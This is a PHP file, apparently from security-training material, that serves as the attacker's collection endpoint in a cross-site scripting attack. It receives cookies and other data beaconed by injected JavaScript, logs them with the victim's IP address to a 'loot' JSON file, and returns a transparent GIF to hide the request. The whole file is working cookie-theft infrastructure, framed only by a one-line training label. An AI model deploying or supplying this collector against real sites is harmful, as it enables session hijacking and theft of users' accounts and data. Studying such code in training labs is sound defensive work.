<?php
/* ============================================================================
 *  EvilCorp C2 - exfiltration sink. The victim's injected JS beacons here:
 *      GET collect.php?cookie=<...>&data=<...>
 *  Appends the loot to a JSON file and returns a 1x1 transparent GIF.
 *  FOR SECURITY TRAINING ONLY.
 * ==========================================================================*/

// Record timestamps in UTC.
date_default_timezone_set('UTC');

$file = sys_get_temp_dir() . '/evilcorp_loot.json';

$loot = [];
if (is_file($file)) {
    $loot = json_decode(file_get_contents($file), true);
    if (!is_array($loot)) { $loot = []; }
}

$loot[] = [
    'time'   => date('Y-m-d H:i:s'),
    'ip'     => $_SERVER['REMOTE_ADDR'] ?? '',
    'cookie' => $_GET['cookie'] ?? '',
    'data'   => $_GET['data'] ?? '',
];

file_put_contents($file, json_encode($loot), LOCK_EX);

// 1x1 transparent GIF
header('Content-Type: image/gif');
echo base64_decode('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7');
